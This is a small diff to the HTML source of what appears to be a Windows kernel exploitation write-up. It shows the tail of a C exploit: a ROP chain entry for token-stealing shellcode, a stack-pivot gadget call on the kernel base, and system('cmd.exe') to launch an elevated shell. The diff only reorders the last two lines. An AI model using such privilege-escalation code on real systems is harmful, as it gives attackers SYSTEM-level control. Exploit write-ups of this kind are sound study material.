@@ -1667,9 +1667,9 @@ pfn 9f03b     ---DA--UWEV  pfn 9f03c     ---DA--UWEV  pfn 9f07b     ---DA--UWEV 
     </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">     // Token Stealing</span><span class="p">
 
     ExecuteAddress(hDevice, kernelBase</span><span class="o"> +</span><span class="mi"> 0x3739b0</span><span class="p">);</span><span class="c1"> // mov esp, 0x48000000; add esp, 0x28; ret;
-    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
+    </span><span class="p">CloseHandle(hDevice);
 
-    CloseHandle(hDevice);
+    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
 }</span>
 </code></pre></div></div><br>
 
